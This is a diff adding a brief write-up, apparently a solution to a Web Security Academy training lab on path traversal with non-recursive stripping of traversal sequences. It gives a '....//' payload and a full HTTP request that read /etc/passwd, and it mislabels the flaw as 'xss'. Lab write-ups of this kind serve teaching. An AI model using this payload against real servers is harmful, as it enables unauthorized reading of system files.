@@ -1,0 +1,22 @@
+File path traversal, traversal sequences stripped non-recursively
+
+Solution porvided is great.
+
+Same issue of xss in file path. Replace the filename with your desired path, but wtih longer spaces this time:
+https://ace91f601f824232803892650003008b.web-security-academy.net/image?filename=....//....//....//etc/passwd
+
+Request:
+
+GET /image?filename=....//....//....//etc/passwd HTTP/1.1
+Host: ace91f601f824232803892650003008b.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=xcKhzOcIXvc3oAJNgzqMGvFv1ocbbopw
+Upgrade-Insecure-Requests: 1
+
+
+You can use a tool such as kadimus to look for LFIs. Unfortunately it wouldn't find this one, but I forked the project and added it:
+https://github.com/robsware/kadimus
